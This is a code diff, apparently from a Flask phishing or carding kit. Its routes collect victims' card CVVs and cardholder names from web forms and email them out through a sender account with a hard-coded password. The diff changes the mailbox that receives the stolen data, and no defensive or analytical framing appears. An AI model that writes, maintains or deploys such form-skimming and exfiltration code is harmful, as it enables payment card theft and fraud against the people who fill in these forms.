@@ -151,7 +151,7 @@ def first():
         cvv = request.form.get("cvv")
         cardholdername =  request.form.get("cardHolderName")
         sender_email = "change@bseng2i.com"
-        receiver_email = "Sealer2024@proton.me"
+        receiver_email = "sealer2025@gmail.com"
         password = "o;&5N]nkTv]M"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
@@ -193,7 +193,7 @@ def second():
         cvv = request.form.get("cvv")
         cardholdername =  request.form.get("cardHolderName")
         sender_email = "change@bseng2i.com"
-        receiver_email = "Sealer2024@proton.me"
+        receiver_email = "sealer2025@gmail.com"
         password = "o;&5N]nkTv]M"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
